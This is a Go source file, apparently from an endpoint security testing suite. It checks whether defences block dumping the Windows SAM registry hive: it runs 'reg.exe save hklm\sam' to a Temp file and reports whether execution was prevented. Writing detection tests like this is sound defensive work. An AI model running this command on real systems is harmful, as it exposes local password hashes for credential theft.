//go:build windows
// +build windows

/*
ID: a7e7bfa3-088e-4f13-b29e-3986e0e756b8
NAME: Credential Acquisition via Registry Hive Dumping
CREATED: 2024-05-21
scenario: export registry hives [`SAM`, `SECURITY`] using `reg.exe` -> dump
*/
package main

import (
	_ "embed"
	"runtime"

	Endpoint "github.com/preludeorg/test/endpoint"
)

/*
`reg.exe` to dump SAM registry hive to file in Temp dir
*/
var supported = map[string][]string{
	"windows": {
		"reg.exe", "save", "hklm\\sam", "C:\\Windows\\Temp\\sam.hiv",
	},
}

func test() {
	println("[+] Attempting to dump SAM registry hive using reg.exe")

	command := supported[runtime.GOOS]
	_, err := Endpoint.Shell(command)
	if err != nil {
		println("[+] Execution was prevented")
		Endpoint.Stop(100)
		return
	}

	println("[-] SAM registry hive dump was not blocked")
	Endpoint.Stop(101)
}

func main() {
	Endpoint.Start(test)
}